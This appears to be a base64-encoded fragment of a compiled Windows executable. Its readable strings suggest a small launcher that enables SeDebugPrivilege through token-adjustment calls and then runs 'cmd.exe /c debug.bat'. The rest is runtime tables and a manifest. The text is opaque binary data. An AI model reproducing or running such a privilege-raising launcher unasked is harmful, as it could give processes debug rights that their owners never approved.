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XRNb2R1bGVIYW5kbGVXAAAfAUV4aXRQcm9jZXNzAMsARGVjb2RlUG9pbnRlcgB8BFNldEhhbmRsZUNvdW50AABrAkdldFN0ZEhhbmRsZQAA6wJJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50APoBR2V0RmlsZVR5cGUAagJHZXRTdGFydHVwSW5mb1cA0gBEZWxldGVDcml0aWNhbFNlY3Rpb24AGQJHZXRNb2R1bGVGaWxlTmFtZUEAAGcBRnJlZUVudmlyb25tZW50U3RyaW5nc1cAIAVXaWRlQ2hhclRvTXVsdGlCeXRlAOEBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAA2wJIZWFwU2V0SW5mb3JtYXRpb24AAKoCR2V0VmVyc2lvbgAA1QJIZWFwQ3JlYXRlAADWAkhlYXBEZXN0cm95AKkDUXVlcnlQZXJmb3JtYW5jZUNvdW50ZXIAmgJHZXRUaWNrQ291bnQAAMcBR2V0Q3VycmVudFByb2Nlc3NJZACAAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lANMCSGVhcEFsbG9jALQDUmFpc2VFeGNlcHRpb24AACEEUnRsUGNUb0ZpbGVIZWFkZXIAOwNMZWF2ZUNyaXRpY2FsU2VjdGlvbgAA8gBFbnRlckNyaXRpY2FsU2VjdGlvbgAAeAFHZXRDUEluZm8AbgFHZXRBQ1AAAD4CR2V0T0VNQ1AAAAwDSXNWYWxpZENvZGVQYWdlANoCSGVhcFJlQWxsb2MAQQNMb2FkTGlicmFyeVcAADQFV3JpdGVGaWxlABoCR2V0TW9kdWxlRmlsZU5hbWVXAADcAkhlYXBTaXplAAAvA0xDTWFwU3RyaW5nVwAAaQNNdWx0aUJ5dGVUb1dpZGVDaGFyAHACR2V0U3RyaW5nVHlwZVcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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